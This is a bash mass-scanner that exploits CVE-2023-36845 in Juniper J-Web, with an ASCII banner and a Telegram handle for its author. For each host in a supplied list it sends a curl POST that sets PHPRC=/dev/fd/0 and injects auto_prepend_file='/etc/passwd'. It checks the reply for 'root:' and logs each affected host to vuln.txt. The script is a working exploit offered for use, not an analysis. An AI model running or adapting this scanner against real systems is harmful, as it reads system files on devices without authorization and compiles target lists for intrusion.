#!/bin/bash
# ref: 
# https://supportportal.juniper.net/s/article/2023-08-Out-of-Cycle-Security-Bulletin-Junos-OS-SRX-Series-and-EX-Series-Multiple-vulnerabilities-in-J-Web-can-be-combined-to-allow-a-preAuth-Remote-Code-Execution?language=en_US
# https://vulncheck.com/blog/juniper-cve-2023-36845
# https://securityaffairs.com/151037/hacking/12000-juniper-devices-cve-2023-36845.html
echo " ______       _______     ____  ___ ____  _____       _____  __   ___  _   _ ____  "
echo "/ ___\ \    / / ____|    |___ \/ _ \___ \|___ /      |___ / / / _( _ )| || || ___| "
echo "| |    \ \ / /|  _| _____ __) | | | |__) | |_ \ _____ |_ \| '_ \ / _ \| || ||___ \ "
echo "| |___  \ V / | |__|_____/ __/| |_| / __/ ___) |_____|__) | (_) | (_) |__   _|__) |"
echo "\____|   \_/  |_____|   |_____|\___/_____|____/      |____/ \___/\___/   |_||____/ "
echo "Written by Zaen                       Juniper firewall Remote Code Execution (RCE) "
echo "t.me/zaenhxr"
echo
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <file.txt>"
    exit 1
fi
input_file="$1"
if [ ! -f "$input_file" ]; then
    echo "File $input_file not found"
    exit 1
fi
> vuln.txt
while IFS= read -r host; do
    response=$(curl -sk "http://$host/?PHPRC=/dev/fd/0" -X POST -d 'auto_prepend_file="/etc/passwd"')
    if echo "$response" | grep -qi 'root:'; then  
        echo "$host" >> vuln.txt       
        echo "[+] $host => VULN"
    fi
done < "$input_file"
